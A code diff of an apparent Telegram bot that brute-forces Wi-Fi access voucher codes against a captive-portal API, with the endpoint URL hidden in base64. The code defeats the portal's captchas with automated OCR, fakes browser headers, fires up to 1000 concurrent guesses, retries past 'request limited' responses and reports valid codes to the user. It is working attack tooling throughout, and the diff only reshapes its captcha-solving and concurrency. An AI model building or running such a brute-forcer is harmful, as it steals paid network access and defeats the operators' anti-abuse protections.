@@ -60,20 +60,9 @@ limited_texts    = {}
 captcha_state    = {}
 session          = None
 _connector       = None
+CONCURRENCY      = 1000
+_voucher_sem     = None
 _start_time      = time.monotonic()
-
-# ── Speed tuning ──────────────────────────────────────────
-VOUCHER_CONCURRENCY = 1000   # voucher POST တပြိုင်နက်
-CAPTCHA_POOL_SIZE   = 100    # pre-solved captcha အရေအတွက်
-CAPTCHA_SOLVERS     = 40     # captcha တပြိုင်နက် solve လုပ်သောလုပ်သား
-BATCH_SIZE          = 1000   # တကြိမ်စစ်သော code အရေအတွက်
-
-# ── Captcha pool (per scan) ───────────────────────────────
-_captcha_pool  = None   # asyncio.Queue — pre-solved (session_id, auth_code) pairs
-_filler_task   = None   # background task
-
-_voucher_sem   = None   # initialized in run_bruteforce
-_captcha_sem   = None   # initialized in run_bruteforce
 
 MAX_CONCURRENT_SCANS = 20
 active_scans_count   = 0
@@ -139,7 +128,7 @@ def get_voucher_keyboard():
         InlineKeyboardButton("🔤 VOUCHER ascii-lower 9လုံး", callback_data="scan_ascii-lower9"),
         InlineKeyboardButton("🎲 VOUCHER all",                callback_data="scan_all"),
         InlineKeyboardButton("🔤+🔢 MIXED 6လုံး",            callback_data="scan_mixed"),
-        InlineKeyboardButton("🔤+🔢 MIXED 7လုံး",            callback_data="scan_mixed7"),
+        InlineKeyboardButton("🔤+🔢 MIXED 7လုံး",            callback_data="scan_mixed7"),   # NEW
         InlineKeyboardButton("🔤+🔢 MIXED 8လုံး",            callback_data="scan_mixed8"),
         InlineKeyboardButton("🔤+🔢 MIXED 9လုံး",            callback_data="scan_mixed9"),
         InlineKeyboardButton("🔙 Back",                       callback_data="menu_back"),
@@ -556,7 +545,7 @@ async def handle_key_scan(message):
         await bot.reply_to(
             message,
             "VOUCHER ရွေးချယ်ရန်:\n\n"
-            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
+            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed7, mixed8, mixed9",  # mixed7 added
             reply_markup=get_voucher_keyboard()
         )
         return
@@ -721,7 +710,7 @@ def iter_codes(mode, start_digit=None):
     elif mode == "mixed":
         while True:
             yield mixed_generator(6)
-    elif mode == "mixed7":
+    elif mode == "mixed7":                     # NEW
         while True:
             yield mixed_generator(7)
     elif mode == "mixed8":
@@ -756,13 +745,13 @@ def format_progress(checked, total=None, speed=0, found=0):
         f"📊Status : running\n"
     )
 
+BATCH_SIZE = 1000
+
 # ───────────────────────────────────────────────────────────
 # Brute-force runner
 # ───────────────────────────────────────────────────────────
 async def run_bruteforce(mode, chat_id, session_url, scan_id,
                          message=None, progress_msg=None, start_digit=None):
-    global _captcha_pool, _filler_task, _voucher_sem
-
     try:
         code_iter = iter_codes(mode, start_digit=start_digit)
     except ValueError as e:
@@ -771,28 +760,12 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 
     total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
 
-    # ── Start captcha pool ───────────────────────────────
-    _captcha_pool = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
-    _filler_task  = asyncio.create_task(
-        _fill_captcha_pool(_captcha_pool, session_url, scan_id, chat_id)
-    )
+    checked    = 0
+    scan_start = time.monotonic()
 
-    # Wait for pool to warm up (min 30 pre-solved captchas)
-    warm_msg = await bot.send_message(
-        chat_id, "⚡ Captcha Pool ပြင်ဆင်နေသည်... (3-5s)"
-    )
-    for _ in range(60):
-        if _captcha_pool.qsize() >= 30:
-            break
-        await asyncio.sleep(0.1)
-    try:
-        await bot.delete_message(chat_id, warm_msg.message_id)
-    except Exception:
-        pass
-
-    _voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
-    checked      = 0
-    scan_start   = time.monotonic()
+    global _voucher_sem
+    if _voucher_sem is None:
+        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
     try:
         while True:
@@ -816,9 +789,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 
             async def _check(code):
                 async with _voucher_sem:
-                    return await perform_check(
-                        session_url, code, chat_id, scan_id, message=message
-                    )
+                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
             checked += len(batch)
@@ -856,15 +827,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
         await send_success_file(chat_id)
 
     finally:
-        # Stop captcha pool filler
-        if _filler_task and not _filler_task.done():
-            _filler_task.cancel()
-            try:
-                await _filler_task
-            except asyncio.CancelledError:
-                pass
-        _captcha_pool = None
-
         await send_success_file(chat_id)
         scan_tasks.pop(chat_id, None)
         success_messages.pop(chat_id, None)
@@ -909,20 +871,9 @@ def _ocr_sync(image_bytes):
     img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
     if img is None:
         return None
-    # 2× upscale — OCR accuracy တိုးသည်
-    img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    # Denoise
-    gray = cv2.fastNlMeansDenoising(gray, h=10)
-    # Sharpen
-    kernel = np.array([[0,-1,0],[-1,5,-1],[0,-1,0]])
-    gray   = cv2.filter2D(gray, -1, kernel)
-    # Otsu threshold
+    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
     blur  = cv2.GaussianBlur(gray, (3, 3), 0)
     _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    # Morphological close — ကျိုးတဲ့ stroke ချိတ်ဆက်ရန်
-    k  = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
-    th = cv2.morphologyEx(th, cv2.MORPH_CLOSE, k)
     _, bf = cv2.imencode('.png', th)
     return _ocr.classification(bf.tobytes()).upper()
 
@@ -960,87 +911,8 @@ async def Varify_Captcha(sess, session_id, text):
         return session_id if data.get("success") else None
 
 # ───────────────────────────────────────────────────────────
-# Captcha pool — background pre-solver
+# Core voucher check
 # ───────────────────────────────────────────────────────────
-async def _solve_one_captcha(pool, session_url):
-    """Solve one captcha and push to pool."""
-    try:
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=15),
-        ) as ts:
-            sid = await get_session_id(ts, session_url)
-            if not sid: return
-            for _ in range(10):
-                try:
-                    img  = await Captcha_Image(ts, sid)
-                    text = await Captcha_Text(img)
-                    if text and await Varify_Captcha(ts, sid, text):
-                        try:
-                            pool.put_nowait((sid, text))
-                        except asyncio.QueueFull:
-                            pass
-                        return
-                except Exception:
-                    continue
-    except Exception:
-        pass
-
-async def _fill_captcha_pool(pool, session_url, scan_id, chat_id):
-    """Background task — keeps captcha pool full."""
-    global _captcha_sem
-    while True:
-        cur = scan_tasks.get(chat_id)
-        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
-            return
-        needed = CAPTCHA_POOL_SIZE - pool.qsize()
-        if needed > 0:
-            tasks = [
-                asyncio.create_task(_solve_one_captcha(pool, session_url))
-                for _ in range(min(needed, CAPTCHA_SOLVERS))
-            ]
-            await asyncio.gather(*tasks, return_exceptions=True)
-        else:
-            await asyncio.sleep(0.05)
-
-async def _solve_captcha_once(session_url):
-    """Solve one captcha on-demand (for recheck mode)."""
-    async with aiohttp.ClientSession(
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=aiohttp.ClientTimeout(total=20),
-    ) as ts:
-        sid = await get_session_id(ts, session_url)
-        if not sid: return None, None
-        for _ in range(10):
-            try:
-                img  = await Captcha_Image(ts, sid)
-                text = await Captcha_Text(img)
-                if text and await Varify_Captcha(ts, sid, text):
-                    return sid, text
-            except Exception:
-                continue
-    return None, None
-
-# ───────────────────────────────────────────────────────────
-# Core voucher check  (pool-based — 1 HTTP request per code)
-# ───────────────────────────────────────────────────────────
-POST_URL = base64.b64decode(
-    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-).decode()
-
-_VOUCHER_HEADERS = {
-    "authority":    "portal-as.ruijienetworks.com",
-    "accept":       "*/*",
-    "content-type": "application/json",
-    "origin":       "https://portal-as.ruijienetworks.com",
-    "user-agent":   ("Mozilla/5.0 (Linux; Android 12; K) "
-                     "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
-}
-
 async def perform_check(session_url, code, chat_id, scan_id=None,
                         recheck=False, message=None):
     if not recheck:
@@ -1048,47 +920,67 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         if not cur or cur.get("scan_id") != scan_id:
             return
 
-    # ── Get captcha ──────────────────────────────────────
-    if recheck:
-        # On-demand solve for recheck
-        session_id, auth_code = await _solve_captcha_once(session_url)
-        if not session_id:
-            return
-    else:
-        # Pull pre-solved captcha from pool (fast path)
-        pool = _captcha_pool
-        if pool is None:
-            return
-        try:
-            session_id, auth_code = await asyncio.wait_for(pool.get(), timeout=8.0)
-        except asyncio.TimeoutError:
-            return None
+    post_url = base64.b64decode(
+        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+    ).decode()
 
-    # ── Single voucher POST ──────────────────────────────
     response = None
-    try:
+
+    for attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=12),
+            connector=_connector, connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(), timeout=timeout
         ) as ts:
-            async with ts.post(
-                POST_URL,
-                json={"accessCode": code, "sessionId": session_id,
-                      "apiVersion": 1,    "authCode":  auth_code},
-                headers=_VOUCHER_HEADERS,
-            ) as req:
-                response = await req.text()
-    except Exception as e:
-        print(f"[voucher] {e}")
-        return None
+            session_id = await get_session_id(ts, session_url, None)
+            if not session_id:
+                continue
+
+            auth_code = None
+            for _ in range(8):
+                try:
+                    image = await Captcha_Image(ts, session_id)
+                    text  = await Captcha_Text(image)
+                    if text and await Varify_Captcha(ts, session_id, text):
+                        auth_code = text
+                        break
+                except Exception as e:
+                    print(f"[captcha] {e}")
+            if not auth_code:
+                continue
+
+            if not recheck:
+                cur = scan_tasks.get(chat_id)
+                if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
+                    return
+
+            try:
+                async with ts.post(
+                    post_url,
+                    json={"accessCode": code, "sessionId": session_id,
+                          "apiVersion": 1, "authCode": auth_code},
+                    headers={
+                        "authority":    "portal-as.ruijienetworks.com",
+                        "accept":       "*/*",
+                        "content-type": "application/json",
+                        "origin":       "https://portal-as.ruijienetworks.com",
+                        "user-agent":   ("Mozilla/5.0 (Linux; Android 12; K) "
+                                         "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
+                    }
+                ) as req:
+                    response = await req.text()
+                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:60]}")
+            except Exception as e:
+                print(f"[perform_check] {e}")
+                return
+
+        if response and 'request limited' in response:
+            response = None
+            continue
+        break
 
     if not response:
-        return None
-
-    if 'request limited' in response:
-        return None  # captcha pool filler ကသစ်ဖြည့်မည်
+        return
 
     # ── SUCCESS ──────────────────────────────────────────
     if 'logonUrl' in response:
